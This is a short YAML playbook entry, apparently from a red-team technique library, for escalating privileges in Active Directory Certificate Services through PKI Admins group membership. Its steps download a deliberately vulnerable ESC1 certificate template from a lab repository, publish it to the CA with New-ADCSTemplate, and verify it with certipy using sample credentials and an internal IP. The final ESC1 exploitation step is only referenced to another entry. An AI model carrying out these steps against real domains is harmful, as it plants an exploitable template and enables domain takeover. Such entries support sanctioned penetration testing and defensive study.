title: PKI Admin Group Privilege Escalation
category: 
  - AD:
    - ADCS
tactic: Privilege Escalation
tags: []
description:
  - title: Overview
    content: PKI Admin Group Privilege Escalation
    references:
      - type: link
        value: https://github.com/GoateePFE/ADCSTemplate
      - type: link
        value: https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json

steps:
  - description: Download a vulnerable template
    options:
      - tool: wget
        usage: wget https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json
        comments:
      
  - description: Add a vulnerable template to the ADCS server
    options:
      - tool: powershell
        usage: |
          New-ADCSTemplate -DisplayName ESC1 -JSON (Get-Content .\default.json -Raw) -Publish -Identity "CODER\PKI Admins"
        comments:
  
  - description: Confirm that the new tamplate has been added
    options:
      - tool: powershellcertipy
        usage: |
          certipy find -u user@domain.com -p 'P@ssw0rd' -dc-ip 10.129.229.10 -debug -target dc.domain.com -vulnerable
        comments:
  
  - description: Exploit ECS1 using T-privilege_escalation-win-ad-adcs_esc1

  